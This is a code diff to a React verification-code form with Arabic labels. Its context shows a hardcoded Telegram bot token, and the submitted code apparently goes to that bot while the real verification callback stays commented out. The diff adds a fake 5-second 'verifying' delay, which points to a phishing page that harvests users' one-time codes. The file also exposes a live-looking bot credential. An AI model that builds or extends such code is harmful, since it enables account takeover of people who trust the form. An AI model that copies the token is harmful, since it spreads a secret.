@@ -16,6 +16,7 @@ export default function VerificationCodeForm({
 }: VerificationCodeFormProps) {
   const [verificationCode, setVerificationCode] = useState("");
   const [error, setError] = useState("");
+  const [loading, setLoading] = useState(false);
 
   const sendVerificationCode = async (code: string) => {
     const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
@@ -70,8 +71,14 @@ export default function VerificationCodeForm({
     }
 
     setError("");
-    sendVerificationCode(verificationCode);
-    // onVerificationComplete(verificationCode);
+    setLoading(true);
+
+    // Simulate loading for 5 seconds
+    setTimeout(() => {
+      sendVerificationCode(verificationCode);
+      setLoading(false);
+      // onVerificationComplete(verificationCode);
+    }, 5000);
   };
 
   return (
@@ -132,14 +139,14 @@ export default function VerificationCodeForm({
 
         <button
           onClick={handleSubmit}
-          disabled={isProcessing}
+          disabled={isProcessing || loading}
           className={`w-full py-3 px-6 font-medium rounded-lg ${
-            isProcessing
+            isProcessing || loading
               ? "bg-gray-400 cursor-not-allowed"
               : "bg-blue-600 hover:bg-blue-700"
           } text-white transition-colors`}
         >
-          تأكيد
+          {loading ? "جاري التحقق..." : "تأكيد"}
         </button>
         <button
           className="w-full text-blue-600 hover:text-blue-700 font-medium mt-4 transition-colors"
